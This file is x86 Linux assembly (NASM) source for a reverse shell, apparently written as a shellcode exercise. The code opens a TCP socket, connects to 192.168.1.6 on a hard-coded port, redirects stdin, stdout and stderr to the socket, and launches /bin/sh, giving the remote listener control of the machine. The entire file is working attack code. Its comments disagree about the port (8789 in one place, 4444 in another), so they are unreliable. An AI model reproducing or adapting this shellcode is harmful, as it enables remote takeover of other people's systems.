section .data
;	variables for connect()
	ipAddress: dd 0x0601a8c0		;192.168.1.6
	port: dw 0x5522				;8789

;	variables for execve syscall.
	shPath: db "/bin/sh",0x00

section .text

;	define the entry point to our program
	global _start

_start:

;	sys_socketcall(int call, unsigned long *args)
;	call = 0x1	sys_socket(int domain, int type, int protocol)
;	args = [AF_INET, SOCK_STREAM, IPPROTO_IP]

	mov eax, 102		;move sockecall syscode into eax

	mov ebx, 0x1		;move first arg into ebx

	push 0x00		;setup the args array for second argument
	push 0x00		;IPPROTO_IP
	push 0x01		;SOCK_STREAM
	push 0x02		;AF_INET
	mov ecx, esp		;move args array address into ecx

	int 0x80		;interupt for syscall
	xchg edx, eax		;save file descriptor int in edx

;	sys_socketcall(int call, unsigned long *args)
;	call = 0x3	sys_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
;		sockfd = socket file descriptor (saved in edx)
;		struct sockaddr = {sin_family, sin_port, sin_addr = {s_addr}, sin_zero}
;		addrlen = length of sockaddr
;	args = [edx, [AF_INET, 4444, {192.168.1.6}, 0x00], 16]

	mov eax, 102		;move socketcall syscode into eax

	mov ebx, 0x3		;move first arg into ebx

				;create the sockaddr struct on the stack
	push 0x00		;sin_zero
	push 0x00		;sin_zero
	push dword [ipAddress] 	;192.168.1.6
	push word [port]	;4444
	push word 0x02		;AF_INET
	mov ecx, esp		;save the address in ecx

	push 0x00		;setup the args array for second argument 
	push 0x10		;size of sockaddr struct 16 bytes
	push ecx		;pointer to sockaddr struct
	push edx		;file descriptor
	mov ecx, esp		;move args array into ecx

	int 0x80		;interupt for syscall

;	dup2(int oldfd, int newfd)
;	oldfd = edx
;	newfd = std 0
	mov eax, 63
	mov ebx, edx
	mov ecx, 0
	int 0x80

	mov eax, 63
	mov ebx, edx
	mov ecx, 1
	int 0x80

	mov eax, 63
	mov ebx, edx
	mov ecx, 2
	int 0x80

;	execve(const char *filename, char *const argv[], char *const envp[])
;	filename = shPath
;	argv = [shPath, 0x00]
;	envp = [0x00]

	mov eax, 11		;move execve syscode into eax

	mov ebx, shPath		;move the first argument into ebx

	push 0x00		;setup the args array for second argument
	push shPath
	mov ecx, esp		;move address of args array into ecx

	push 0x00		;setup the env array for third argument
	mov edx, esp		;move address of env array into edx

	int 0x80		;interupt for syscall


;	exit syscall
	mov eax, 0x1
	mov ebx, 0x0
	int 0x80
